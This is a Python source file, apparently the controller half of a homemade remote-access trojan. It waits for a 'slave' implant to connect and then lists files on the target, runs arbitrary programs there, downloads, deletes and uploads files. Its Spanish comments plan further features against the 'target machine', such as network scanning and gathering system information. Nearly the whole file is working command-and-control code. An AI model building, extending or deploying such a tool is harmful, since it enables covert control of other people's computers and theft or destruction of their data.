#!/usr/bin/env python
#_*_ coding utf8 _*_

#Ideas: agregar un comando de ayuda (help) para poder ver los comandos que se pueden utilizar,
#automatizar la obtencion de la ip de la maquina que corre este script,
#hay algunos errores con el envio de archivos docx y pdf, algunas veces salen corruptos,
#agregar otros comandos para obtener mas funcionalidades en la maquina objetivo,
#algunas ideas de comandos: obtener toda la informacion del equipo objetivo, hacer un escaneo de la red, obtener ip publica,


import os
import socket
from colorama import Fore, init

init()

s = socket.socket() #socket instance
#host = socket.gethostname() #getting name of the operating system machine
host = '192.168.1.2' #set your device ip
port = 8080 
s.bind((host, port)) #assign an ip and port to the socket instance for establish connection with other machine
print("\n{}[{}+{}]Server is currently running at {}@{}".format(Fore.LIGHTWHITE_EX, Fore.LIGHTGREEN_EX,Fore.LIGHTWHITE_EX, Fore.LIGHTGREEN_EX, host))
print("\n{}Waiting for connections...".format(Fore.LIGHTWHITE_EX))
s.listen(1) #waiting for connections (from slave.py in this case)
conn, addr = s.accept() #accept the connection
print("{}{}{} Has connected to the server successfully".format(Fore.LIGHTGREEN_EX, addr, Fore.LIGHTWHITE_EX))

#connection has been complete

#command handling

while True:
    print(Fore.LIGHTCYAN_EX)
    command = input(str("Command >>> "))
    if command == "getcwd":
        conn.send(command.encode()) #send the command to slave script for execution
        print("\n{}Command sent, waiting for execution...".format(Fore.LIGHTWHITE_EX))
        directory = conn.recv(5000) #receive the response from the slave script
        directory = directory.decode() #decode the received info
        files = conn.recv(5000)
        files = files.decode()
        print("\n{}Directory: {}{}{} \nFiles: {}{}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX,directory,Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, files)) #show received info
    
    elif command == "execute": #execute any coomand on slave machine
        conn.send(command.encode())        
        program = input(str("Program >>> "))
        print(f'{Fore.LIGHTWHITE_EX}Command sent, waiting for execution...')
        conn.send(program.encode())          

    elif command == "custom_dir":
        conn.send(command.encode()) #send command to slave script
        userInput = input(str(" >Set custom dir: "))
        conn.send(userInput.encode()) #send the custom dir
        print("\n{}Command has been sent...".format(Fore.LIGHTWHITE_EX))        
        path = conn.recv(5000) #receive data from slave script           
        path = files.decode()
        print("{}\nCustom dir result: {}{}".format(Fore.LIGHTGREEN_EX,Fore.LIGHTWHITE_EX, path)) 

    elif command == 'download_file':   
        conn.send(command.encode()) 
        filePath = input(str(' >Set path with file and extension: '))
        conn.send(filePath.encode()) 
        fileName = conn.recv(5000) #receive the filename for create the new file with this name
        file = conn.recv(70000) #receive the file
        try:
            newFile = open(fileName, "wb") #create a file whit the original name and original extension
            newFile.write(file)#write info into the new file    
        except Exception as e:
            print('\n{}[{}${}]The original file name has unsupported characters.\nPlease insert a custom name for the file'.format(Fore.LIGHTWHITE_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTWHITE_EX))
            fileName = input(str('\nInsert new file name with orginal extension: '))
            newFile = open(fileName, 'wb')
            newFile.write(file)

        newFile.close()
        print('\n{}[{}+{}]File has been downloaded and saved'.format(Fore.LIGHTWHITE_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX))

    elif command == 'remove_file':
        conn.send(command.encode())
        rmFile = input(str(' >Set path with file and extention: '))
        conn.send(rmFile.encode())
        log = conn.recv(5000) #receive an error if it was ocurred or the mesagge of succesfully removed file 
        log = log.decode()
        print(log)

    elif command == 'send_file': #send data to target
        conn.send(command.encode())
        file = input(str(' >Set path with file and extention: ')) #idea: request the shipping path          
        data = open(file, 'rb')        
        fileName = str(os.path.basename(data.name))
        fileData = data.read(7000) #increase number if the file is big; get name of the file with extention for send with the same name and extention
        conn.send(fileName.encode())
        conn.send(fileData)
        print('\n{}[{}+{}] {} has been sent successfully...'.format(Fore.LIGHTWHITE_EX, Fore.LIGHTGREEN_EX,Fore.LIGHTWHITE_EX,fileName))

    elif command == 'exit':
        conn.send(command.encode())
        quit() 

    else:
        print("\n{}[{}*{}]Command not recognised".format(Fore.LIGHTWHITE_EX, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))